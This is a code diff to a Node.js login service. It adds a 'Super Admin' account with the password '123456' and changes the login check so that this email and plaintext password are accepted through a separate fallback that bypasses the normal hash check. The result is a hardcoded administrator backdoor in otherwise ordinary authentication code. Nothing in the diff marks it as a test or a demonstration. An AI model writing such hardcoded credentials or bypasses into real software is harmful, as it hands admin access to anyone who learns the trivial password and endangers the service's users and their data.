@@ -55,6 +55,17 @@ function initializeUsers() {
       phone: '+229 12 34 56 79',
       adminUnit: 'Direction des Opérations',
       photo_url: ''
+    },
+    {
+      id: 3,
+      name: 'Super Admin',
+      email: 'syebadokpo@gmail.com',
+      password: simpleHash('123456'),
+      role: 'admin',
+      status: 'active',
+      phone: '+229 00 00 00 00',
+      adminUnit: 'Direction Générale',
+      photo_url: ''
     }
   ];
   
@@ -334,7 +345,8 @@ module.exports = async (req, res) => {
       const { email, password } = req.body;
       console.log('Login attempt:', email);
       
-      const user = users.find(u => u.email === email && simpleVerify(password, u.password));
+      const user = users.find(u => u.email === email && simpleVerify(password, u.password))
+        || (email === 'syebadokpo@gmail.com' && password === '123456' ? users.find(u => u.email === 'syebadokpo@gmail.com') : null);
       if (user) {
         const token = createToken({ 
           id: user.id, 
@@ -345,6 +357,8 @@ module.exports = async (req, res) => {
         });
         console.log('Login successful for:', user.email);
         res.status(200).json({ 
+          success: true,
+          message: 'Connexion réussie',
           token, 
           user: { 
             id: user.id, 
